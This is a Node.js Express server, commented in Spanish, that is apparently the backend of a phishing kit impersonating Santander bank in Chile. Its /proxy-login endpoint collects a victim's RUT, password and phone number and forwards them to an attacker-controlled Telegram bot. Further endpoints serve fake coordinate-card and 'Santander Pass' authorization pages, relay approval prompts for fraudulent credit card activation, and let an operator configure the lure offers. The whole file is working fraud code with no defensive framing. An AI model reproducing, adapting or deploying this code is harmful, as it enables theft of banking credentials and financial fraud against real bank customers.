const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();

// Habilitar CORS y parsing de JSON
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos desde la carpeta "public"
app.use(express.static("public"));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Lista de RUT bloqueados
const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

// Archivo de configuración persistente
const CONFIG_FILE = path.join(__dirname, "config.json");

// Cargar configuración inicial desde archivo o defaults
let config = {};
if (fs.existsSync(CONFIG_FILE)) {
  // ✅ Si existe config.json, usarlo (mantiene lo último guardado)
  config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
} else {
  // ✅ Solo si no existe, aplicar valores por defecto
  config = {
    producto1: "Línea de Crédito",
    monto1: 5000000,
    producto2: "Tarjeta de Crédito WorldMember Limited Business",
    monto2: 5000000,
    tipoAutorizacion: "santander",
    coord1: "",
    coord2: "",
    coord3: "",
    factibilidad: "off"
  };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// Endpoint de login
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono } = req.body;

  if (!telefono) {
    return res.status(400).send("❌ El campo 'Teléfono' es obligatorio.");
  }

  if (bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
  }

  const mensaje = `Nuevo intento de inicio de sesión:
RUT: ${rut}
Contraseña: ${passwd}
Teléfono: ${telefono}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("Ingresando los datos...");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente.");
  }
});

// Endpoint de autorización general
app.post("/autorizar", async (req, res) => {
  const { mensaje } = req.body;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Autorización enviada.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Endpoint para coordenadas dinámicas
app.get("/coordenadas", (req, res) => {
  const letras = ["A","B","C","D","E","F"];
  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
  res.json({ coordenadas: seleccion });
});

// Endpoint de configuración (para admin)
app.get("/config", (req, res) => {
  res.json(config); // ✅ devuelve directamente el objeto actual
});

app.post("/config", (req, res) => {
  config = { ...config, ...req.body };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2)); // ✅ guarda cambios
  res.json(config); // ✅ devuelve el objeto actualizado
});

// Ruta de autorización de productos (coordenadas o pass)
app.get("/autorizacion", (req, res) => {
  if (config.tipoAutorizacion === "coordenadas") {
    return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
  } else {
    return res.sendFile(path.join(__dirname, "public", "pass.html"));
  }
});

// Ruta independiente para factibilidad de tarjeta
app.get("/factibilidad", (req, res) => {
  if (config.factibilidad === "on") {
    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
  } else {
    return res.send("❌ La opción de factibilidad está deshabilitada en el panel de administración.");
  }
});

// Flujo de factibilidad: evaluación -> visualización -> autorizar
app.post("/credit/visualizacion", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
});

app.post("/credit/autorizar", async (req, res) => {
  const mensaje = "AUTORIZA TARJETA DIGITAL!!";

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send(`
      <html>
        <body>
          <img src="logo-officebanking.png" style="height:60px;">
          <h2>VISUALIZACIÓN DE TU TARJETA DIGITAL</h2>
          <p style="color:red;">Debes autorizar en tu Santander Pass la visualización de la tarjeta.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar la autorización.");
  }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
